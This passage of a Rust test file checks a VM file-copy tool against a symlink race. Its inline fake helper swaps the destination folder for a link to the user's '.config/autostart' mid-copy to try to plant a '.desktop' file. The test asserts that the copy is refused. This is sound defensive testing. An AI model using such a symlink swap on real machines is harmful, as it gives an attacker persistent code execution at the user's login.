        pasta, alvo = open("{swap}").read().split("\n")[:2]
        os.rename(pasta, pasta + ".velha"); os.symlink(alvo, pasta)
print(json.dumps({{"valor": {{"para": args.get("para")}}, "resumo": "copiado"}}))
"#, swap = swap.display())).unwrap();
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&vd, std::fs::Permissions::from_mode(0o755)).unwrap();
    let d = start_startup_env(&[("KALANGO_VIRTUALDESK", vd.to_str().unwrap())]);
    let mut c = Client::new(&d.sock);
    std::fs::create_dir_all(d.area.join(".config/autostart")).unwrap();
    std::fs::create_dir_all(d.area.join("docs/d")).unwrap();
    // an ordinary copy lands, and the staging folder is gone
    let r = c.call("vm.copiar_arquivo", json!({"id": "ana", "sentido": "da_maquina", "de": "/tmp/x", "para": d.area.join("docs/de-la.txt")}));
    assert_eq!(r["isError"], false, "{r}");
    assert!(std::fs::read_to_string(d.area.join("docs/de-la.txt")).unwrap().contains("Desktop Entry"));
    let staged = std::fs::read_dir(d.area.join(".local/state/kalango/vm-copias")).map(|r| r.count()).unwrap_or(0);
    assert_eq!(staged, 0, "the staging folder is removed");
    // the destination's folder becomes a link to autostart while VirtualDesk copies
    std::fs::write(&swap, format!("{}\n{}\n", d.area.join("docs/d").display(), d.area.join(".config/autostart").display())).unwrap();
    let r = c.call("vm.copiar_arquivo", json!({"id": "ana", "sentido": "da_maquina", "de": "/tmp/x", "para": d.area.join("docs/d/x.desktop")}));
    assert_eq!(r["isError"], true, "{r}");
    assert!(!d.area.join(".config/autostart/x.desktop").exists(), "nothing lands in autostart");
}
